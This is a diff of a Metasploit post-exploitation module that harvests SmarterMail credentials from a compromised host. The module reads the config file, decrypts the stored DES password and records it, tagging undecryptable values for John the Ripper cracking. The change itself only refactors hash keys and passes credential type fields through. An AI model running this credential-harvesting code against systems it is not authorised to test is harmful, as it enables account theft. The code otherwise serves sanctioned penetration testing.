@@ -144,12 +144,12 @@ class Metasploit3 < Msf::Post
 
     if password
       begin
-        result['password'] = decrypt_des(Rex::Text.decode_base64(password))
-        result['password_type'] = :password
+        result[:password] = decrypt_des(Rex::Text.decode_base64(password))
+        result[:private_type] = :password
       rescue OpenSSL::Cipher::CipherError
-        result['password'] = password
-        result['password_type'] = :nonreplayable_hash
-        result['jtr_format'] = 'des'
+        result[:password] = password
+        result[:private_type] = :nonreplayable_hash
+        result[:jtr_format] = 'des'
       end
     end
 
@@ -170,12 +170,12 @@ class Metasploit3 < Msf::Post
       session_id: session_db_id,
       origin_type: :session,
       private_data: opts[:password],
-      private_type: opts[:password_type],
+      private_type: opts[:private_type],
       username: opts[:user]
     }
 
-    if opts['password_type'] == :nonreplayable_hash
-      credential_data.merge!(jtr_format: opts['jtr_format'])
+    if opts[:private_type] == :nonreplayable_hash
+      credential_data.merge!(jtr_format: opts[:jtr_format])
     end
 
     credential_data.merge!(service_data)
@@ -201,15 +201,17 @@ class Metasploit3 < Msf::Post
 
     # retrieve username and decrypted password from config file
     result = get_smartermail_creds(config_path)
-    if result['password'].nil?
+    if result[:password].nil?
       print_error "#{peer} - Could not decrypt password string"
       return
     end
 
     # report result
     port = get_web_server_port || 9998 # Default is 9998
-    user = result['username']
-    pass = result['password']
+    user = result[:username]
+    pass = result[:password]
+    type = result[:private_type]
+    format = result[:jtr_format]
     print_good "#{peer} - Found Username: '#{user}' Password: '#{pass}'"
 
     report_cred(
@@ -218,7 +220,8 @@ class Metasploit3 < Msf::Post
       service_name: 'http',
       user: user,
       password: pass,
-
+      private_type: type,
+      jtr_format: format
     )
   end
 end
